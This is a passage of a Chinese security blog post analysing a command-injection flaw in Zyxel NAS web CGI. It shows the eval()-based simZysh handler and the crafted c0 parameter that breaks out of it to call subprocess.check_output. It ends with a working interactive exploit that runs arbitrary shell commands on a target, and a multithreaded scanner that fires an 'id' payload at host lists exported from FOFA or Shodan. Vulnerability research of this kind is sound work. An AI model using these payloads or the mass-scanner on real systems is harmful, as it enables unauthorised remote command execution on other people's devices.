class="hljs-string">&quot;&quot;&quot;Simulate zyshcgi&#x27;s output. GUI&#x27;s broker shall set command as the following format:</span><br><span class="hljs-string">                        &#x27;controller_name action_name &#123;&quot;arg1&quot;: value, &quot;arg2&quot;: value, ...&#125;&#x27;</span><br><span class="hljs-string">                &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_args:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_str_format(i, <span class="hljs-string">&#x27;url&#x27;</span>):<br>                <span class="hljs-keyword">return</span> tools_cherrypy.ARG_ERROR<br> <br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> request_args.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_str_format(key, <span class="hljs-string">&#x27;request&#x27;</span>):<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_list(key):<br>                    <span class="hljs-keyword">return</span> tools_cherrypy.ARG_ERROR<br>                <br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_str_format(value, <span class="hljs-string">&#x27;request&#x27;</span>):<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_list(value):<br>                    <span class="hljs-keyword">return</span> tools_cherrypy.ARG_ERROR<br> <br>        r_value = &#123;&#125;<br>        c_index = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            c_key = <span class="hljs-string">&#x27;c%d&#x27;</span> % c_index<br>            <span class="hljs-keyword">if</span> request_args.has_key(c_key):<br>                controller_n, action_n, args = request_args[c_key].split(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">try</span>:<br>                    controller = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;controllers.%s&#x27;</span> % controller_n)<br>                    tmp_result = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;controller.%s.%s(cherrypy=%s, arguments=%s)&#x27;</span> % (<br>                     controller_n, action_n, <span class="hljs-string">&#x27;cherrypy&#x27;</span>, args))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> tmp_result:<br>                        <span class="hljs-keyword">raise</span> ValueError<br>                    r_type = <span class="hljs-built_in">type</span>(tmp_result)<br>                    <span class="hljs-keyword">if</span> r_type == <span class="hljs-built_in">list</span>:<br>                        r_value[<span class="hljs-string">&#x27;zyshdata%d&#x27;</span> % c_index] = tmp_result<br>                    <span class="hljs-keyword">else</span>:<br>                        r_value[<span class="hljs-string">&#x27;zyshdata%d&#x27;</span> % c_index] = [<br>                         tmp_result]<br>                    r_value[<span class="hljs-string">&#x27;errno%d&#x27;</span> % c_index] = <span class="hljs-number">0</span><br>                    r_value[<span class="hljs-string">&#x27;errmsg%d&#x27;</span> % c_index] = _(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    r_value[<span class="hljs-string">&#x27;zyshdata%d&#x27;</span> % c_index] = []<br>                    r_value[<span class="hljs-string">&#x27;errno%d&#x27;</span> % c_index] = -<span class="hljs-number">99999</span><br>                    r_value[<span class="hljs-string">&#x27;errmsg%d&#x27;</span> % c_index] = _(<span class="hljs-string">&#x27;Execute Error&#x27;</span>)<br> <br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br>            c_index += <span class="hljs-number">1</span><br> <br>        <span class="hljs-keyword">return</span> r_value<br> <br>    simZysh.exposed = <span class="hljs-literal">True</span><br>......<br></code></pre></td></tr></table></figure>
+
+<p>这段代码是一个使用 CherryPy 框架构建的 Python Web 应用的入口点。</p>
+<h5 id="CherryPy-路由机制"><a href="#CherryPy-路由机制" class="headerlink" title="CherryPy 路由机制"></a>CherryPy 路由机制</h5><p>CherryPy 的路由机制依赖于 URL 中的路径来映射到应用程序中的方法。<code>simZysh</code> 方法通过 <code>exposed = True</code> 公开，因此可以通过特定的 URL 来访问它。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">simZysh.exposed = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>
+
+<p>这意味着 <code>simZysh</code> 是公开的，并可以通过 HTTP 请求直接访问。</p>
+<p>通过访问 <code>/cmd/simZysh/register_main/setCookie</code> 来直接调用该 Python 文件中的 <code>simZysh</code> 函数</p>
+<h5 id="访问路径分析"><a href="#访问路径分析" class="headerlink" title="访问路径分析"></a>访问路径分析</h5><p>访问url时会调用 <code>simZysh</code> 方法，并传递路径中的部分作为参数。假设 <code>simZysh</code> 方法位于 <code>mainApplication</code> 类中，URL <code>/cmd/simZysh/register_main/setCookie</code> 的访问将会调用如下的映射逻辑：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">mainApplication</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-comment"># 其他方法...</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">simZysh</span>(<span class="hljs-params">self, *url_args, **request_args</span>):<br>        <span class="hljs-comment"># 处理逻辑...</span><br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>url_args</code></strong>: 这里的 <code>register_main</code> 和 <code>setCookie</code> 将作为位置参数传递给 <code>simZysh</code> 的 <code>url_args</code>。</li>
+<li><strong><code>request_args</code></strong>: 任何附带的请求参数（例如，POST 或 GET 参数）都会作为 <code>request_args</code> 传递。</li>
+</ul>
+<h6 id="register-main的调用"><a href="#register-main的调用" class="headerlink" title="register_main的调用"></a>register_main的调用</h6><p><code>register_main</code> 和 <code>setCookie</code> 会作为路径中的一部分传递给 <code>simZysh</code> 方法，这些路径会被捕获为 <code>url_args</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">url_args = (<span class="hljs-string">&#x27;register_main&#x27;</span>, <span class="hljs-string">&#x27;setCookie&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>处理请求参数</strong>：<code>simZysh </code>函数的逻辑是从 <code>request_args</code>（请求参数）中取出控制器名称、动作名称和参数。<code>register_main</code> 是控制器名称，<code>setCookie</code> 是动作名称。</p>
+<p><strong>动态调用控制器</strong>：<code>simZysh</code> 中使用了 Python 的 <code>__import__</code> 和 <code>eval()</code> 函数来动态导入并调用控制器中的方法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">controller = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;controllers.%s&#x27;</span> % controller_n)<br>tmp_result = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;controller.%s.%s(cherrypy=%s, arguments=%s)&#x27;</span> % (<br>    controller_n, action_n, <span class="hljs-string">&#x27;cherrypy&#x27;</span>, args))<br></code></pre></td></tr></table></figure>
+
+<p> <code>register_main</code> 代表了一个控制器名，CherryPy 会尝试从 <code>controllers</code> 目录下导入名为 <code>register_main</code> 的控制器模块。随后，它会在 <code>register_main.pyc</code>中调用 <code>setCookie</code> 方法。</p>
+<p>register_main.py文件</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913143000301.png" srcset="/img/loading.gif" lazyload alt="image-20240913143000301"></p>
+<h5 id="参数c0分析"><a href="#参数c0分析" class="headerlink" title="参数c0分析"></a>参数c0分析</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">c0=storage_ext_cgi+CGIGetExtStoInfo+<span class="hljs-literal">None</span>)+<span class="hljs-keyword">and</span>+<span class="hljs-literal">False</span>+<span class="hljs-keyword">or</span>+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>,+shell=<span class="hljs-literal">True</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p>这里<code>c0</code> 是因为代码中 <code>c%d</code> 为 eval() 函数提供数据，每次调用时数字会递增。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">.......<br>        c_index = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            c_key = <span class="hljs-string">&#x27;c%d&#x27;</span> % c_index<br>........<br>            c_index += <span class="hljs-number">1</span><br>.......<br></code></pre></td></tr></table></figure>
+
+<p>simZysh函数会循环遍历 <code>request_args</code> 字典中的键值对，并使用 <code>c_index</code> 变量来记录当前遍历到的参数索引。每次循环中，它会构造一个键名 <code>c_key</code>，例如 <code>c0</code>、<code>c1</code> 等等，并检查 <code>request_args</code> 字典中是否包含该键。</p>
+<p>simZysh 函数会使用 <code>eval</code> 函数来执行 <code>controller_n</code> 模块中的 <code>action_n</code> 函数。</p>
+<p>那么 <code>c0</code> 值会被解析成 <code>controller_n</code>、<code>action_n</code> 和 <code>args</code> 三个部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">controller_n: storage_ext_cgi<br>action_n: CGIGetExtStoInfo<br>args: <span class="hljs-literal">None</span>)+<span class="hljs-keyword">and</span>+<span class="hljs-literal">False</span>+<span class="hljs-keyword">or</span>+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>, shell=<span class="hljs-literal">True</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p>这里的args做了一个python的闭合拼接，通过构造一个特殊的请求参数，绕过了对用户输入的验证，导致了命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-literal">None</span>)+<span class="hljs-keyword">and</span>+<span class="hljs-literal">False</span> 的结果为 <span class="hljs-literal">False</span><br><span class="hljs-literal">False</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>, shell=<span class="hljs-literal">True</span>) 的结果为 <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>, shell=<span class="hljs-literal">True</span>)，<br>因为 <span class="hljs-literal">False</span> 在布尔运算中被视为 <span class="hljs-number">0</span>，而该段python代码的结果是一个非零值。<br>因此该段代码会执行系统命令 ps，并返回命令的输出结果。<br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">requests</span><br><span class="hljs-variable">import</span> <span class="hljs-variable">json</span><br><br><span class="hljs-variable">ip_address</span> = <span class="hljs-function"><span class="hljs-title">input</span>(<span class="hljs-string">&quot;pls input ip(ctrl+c to exit):&quot;</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">while</span></span> <span class="hljs-variable"><span class="hljs-literal">True</span></span>:<br>    <span class="hljs-variable">command</span> = <span class="hljs-function"><span class="hljs-title">input</span>(<span class="hljs-string">&quot;$ &quot;</span>)</span><br>    <span class="hljs-variable">url</span> = <span class="hljs-variable">f</span><span class="hljs-string">&quot;http://&#123;ip_address&#125;/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(\&quot;</span><span class="hljs-variable">subprocess</span>\<span class="hljs-string">&quot;).check_output(\&quot;</span>&#123;<span class="hljs-variable">command</span>&#125;\<span class="hljs-string">&quot;,+shell=True)%23&quot;</span><br>    <span class="hljs-variable">response</span> = <span class="hljs-variable">requests.get</span>(<span class="hljs-variable">url</span>)<br>    <span class="hljs-variable">data</span> = <span class="hljs-variable">json.loads</span>(<span class="hljs-variable">response.text</span>)<br>    <span class="hljs-variable">zyshdata</span> = <span class="hljs-variable">data</span>[<span class="hljs-string">&#x27;zyshdata0&#x27;</span>]<br>    <span class="hljs-variable">for</span> <span class="hljs-variable">item</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-variable">zyshdata</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">item</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913150219048.png" srcset="/img/loading.gif" lazyload alt="image-20240913150219048"></p>
+<h4 id="漏洞批量验证"><a href="#漏洞批量验证" class="headerlink" title="漏洞批量验证"></a>漏洞批量验证</h4><p>通过fofa、shodan等工具导出url list，使用多线程的方式，并行地测试多个目标主机，通过检查响应内容是否包含特定的字符串来判断主机是否存在漏洞。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> RequestException<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> urllib3<br><br><span class="hljs-comment"># 忽略SSL警告</span><br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br><span class="hljs-comment"># 定义payload</span><br>paths_to_check = <span class="hljs-string">&quot;/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+&quot;</span>+<span class="hljs-string">&quot;and+False+or+__import__(\&quot;subprocess\&quot;).check_output(\&quot;id\&quot;,+shell=True)%23&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url, verify=<span class="hljs-literal">False</span>,timeout=<span class="hljs-number">2</span>) <br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 测试单个url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_host</span>(<span class="hljs-params">url</span>):<br>    fullurl = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;paths_to_check&#125;</span>&quot;</span><br>    body = make_request(fullurl)<br>    <span class="hljs-keyword">if</span> body <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;nobody&#x27;</span> <span class="hljs-keyword">in</span> body:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;vulnerable&#x27;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(body)<br><br><span class="hljs-comment"># 多线程调用的Worker函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">queue</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> queue.empty():<br>        url = queue.get()<br>        test_host(url)<br>        queue.task_done()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;CVE-2024-34470&#x27;</span>)<br>    group = parser.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)<br>    group.add_argument(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target URL&#x27;</span>)<br>    group.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File containing list of URLs&#x27;</span>)<br><br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.url:<br>        test_host(args.url)<br>    <span class="hljs-keyword">elif</span> args.file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            urls = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f <span class="hljs-keyword">if</span> line.strip()]<br>            <br>        url_queue = queue.Queue()<br>        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>            url_queue.put(url)<br><br>        threads = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            t = threading.Thread(target=worker, args=(url_queue,))<br>            t.start()<br>            threads.append(t)<br><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>            t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p>示例</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240918113537308.png" srcset="/img/loading.gif" lazyload alt="image-20240918113537308"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>zyxel-NAS命令执行</div>
+      <div>http://groundctl2majortom.github.io/2024/09/01/zyxel-NAS命令执行/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/01/SaTC%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%B5%8B%E8%AF%95/" title="SaTC自动化漏洞分析和实例测试">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SaTC自动化漏洞分析和实例测试</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/16/mqtt%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="mqtt协议学习及漏洞复现">
+                        <span class="hidden-mobile">mqtt协议学习及漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
